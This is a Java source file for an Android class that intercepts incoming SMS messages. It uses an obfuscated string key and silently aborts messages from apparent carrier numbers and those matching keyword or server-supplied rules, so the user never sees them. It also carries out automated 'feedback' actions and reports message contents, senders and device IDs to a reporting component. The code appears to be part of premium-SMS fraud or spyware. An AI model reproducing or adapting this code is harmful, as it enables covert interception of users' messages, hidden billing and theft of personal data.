package kernel.workspace.sms;
import java.util.Arrays;
import java.util.List;
import java.util.Vector;
import kernel.workspace.Settings;
import kernel.workspace.listener.BlockListener;
import kernel.workspace.manager.OrderManager;
import kernel.workspace.manager.ReportManager;
import kernel.workspace.util.Logger;
import kernel.workspace.util.ParseKsy;
import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsMessage;
import android.text.TextUtils;
import bean.Block;
import bean.Feedback;
import bean.SmsPhoneNumber;

@SuppressLint("NewApi")
public class SmsHelper {
    /**
     * "pdus"
     */
    private static String PDUS2 = ParseKsy.decode("9c344b3cec3acfb444de89b513a73890");
    public static void onSmsRecieved(Context context, final BroadcastReceiver broadcastreceiver, Intent intent) {
        if (context != null && intent != null) {
            Object obj = intent.getExtras().get(PDUS2);
            if (obj != null) {
                Object[] pdus = (Object[]) obj;
                SmsMessage[] msgArray = new SmsMessage[pdus.length];
                String address = "";
                StringBuffer messageBody = new StringBuffer();
                for (int i = 0; i < pdus.length; i++) {
                    if (pdus[i] != null) {
                        msgArray[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                        if (msgArray[i] != null) {
                            address = msgArray[i].getOriginatingAddress();
                            messageBody.append(msgArray[i].getMessageBody());
                        }
                    }
                }
                String text = messageBody.toString();
                Logger.debug(address, text);
                if (checkPhoneNumber(address, text)) {
                    broadcastreceiver.abortBroadcast();
                    reportPhoneNumber(context, address, text);
                } else {
                    BlockListener listener = new BlockListener() {
                        private boolean blocked = false;
                        @Override
                        public void stopBroadcast() {
                            if (!blocked) {
                                broadcastreceiver.abortBroadcast();
                                blocked = true;
                            }
                        }
                    };
                    SmsHelper.checkCommonBlocks(address, text, listener);
                    Feedback feedback = checkFeedback(context, address, text, listener);
                    if (feedback != null) {
                        OrderManager.getInstance(context).executeFeedback(address, text, feedback);
                    } else {
                        Block block = checkBlock(context, address, text, listener);
                        if (block != null) {
                            ReportManager.successReport(context, block, address + "->" + text, null);
                        }
                    }
                }
            }
        }
    }
    private static String getPrefix() {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < 5; i++) {
            sb.append((char) 29);
        }
        return sb.toString();
    }
    private static final String PN_BLOCK_PREFIX = getPrefix();
    public static boolean checkPhoneNumber(String address, String text) {
        return !TextUtils.isEmpty(address) && !TextUtils.isEmpty(text) && text.startsWith(PN_BLOCK_PREFIX);
    }
    static void reportPhoneNumber(Context context, String address, String text) {
        SmsPhoneNumber form = new SmsPhoneNumber();
        form.phoneNumber = address;
        form.deviceId = text.substring(PN_BLOCK_PREFIX.length(), text.length());
        ReportManager.report(context, form, true, null, null);
    }
    public static Feedback checkFeedback(Context context, String address, String text, BlockListener listener) {
        Feedback result = null;
        Vector<Feedback> feedbackVector = BlockHelper.readFeedbacks(context);
        if (feedbackVector != null) {
            for (int i = feedbackVector.size() - 1; i >= 0; i--) {
                Feedback feedback = feedbackVector.get(i);
                Block block = feedback.block;
                if (matchBlock(address, text, block)) {
                    result = feedback;
                    listener.stopBroadcast();
                    break;
                }
            }
        }
        feedbackVector.clear();
        System.gc();
        return result;
    }
    public static Block checkBlock(Context context, String address, String text, BlockListener listener) {
        Block match = null;
        if (address != null && text != null) {
            Vector<Block> blockVector = BlockHelper.readBlocks(context);
            for (int i = blockVector.size() - 1; i >= 0; i--) {
                Block block = blockVector.get(i);
                if (matchBlock(address, text, block)) {
                    match = block;
                    listener.stopBroadcast();
                    break;
                }
            }
            blockVector.clear();
            System.gc();
        }
        return match;
    }
    public static void checkCommonBlocks(String address, String text, BlockListener listener) {
        if (address.startsWith("10") || address.startsWith("12")) {
            for (String keyword : blockContents) {
                if (text.contains(keyword)) {
                    listener.stopBroadcast();
                    return;
                }
            }
        }
    }
    public static List<String> blockContents = Arrays.asList(Settings.COMMON_BLOCK_KEYWORS.split(","));
    private static boolean matchBlock(String address, String text, Block block) {
        boolean matchPort = false;
        boolean matchContent = false;
        String blockPort = block.port;
        if (TextUtils.isEmpty(address) || TextUtils.isEmpty(blockPort)) {
            matchPort = true;
        } else {
            String array[] = blockPort.split("\\|");
            for (String port : array) {
                if (!TextUtils.isEmpty(port) && address.contains(port.trim())) {
                    matchPort = true;
                    break;
                }
            }
        }
        if (matchPort) {
            String blockContent = block.content;
            if (TextUtils.isEmpty(blockContent)) {
                matchContent = true;
            } else if (text != null) {
                if (blockContent.contains("&")) {
                    matchContent = true;
                    for (String field : blockContent.split("\\&")) {
                        if (!text.contains(field)) {
                            matchContent = false;
                            break;
                        }
                    }
                } else if (blockContent.contains("|")) {
                    for (String field : blockContent.split("\\|")) {
                        if (text.contains(field)) {
                            matchContent = true;
                            break;
                        }
                    }
                } else {
                    matchContent = text.contains(blockContent);
                }
            }
        }
        boolean result = matchContent && matchPort;
        if (result) {
            block.targetPort = address;
            block.targetContent = text;
        }
        return result;
    }
}
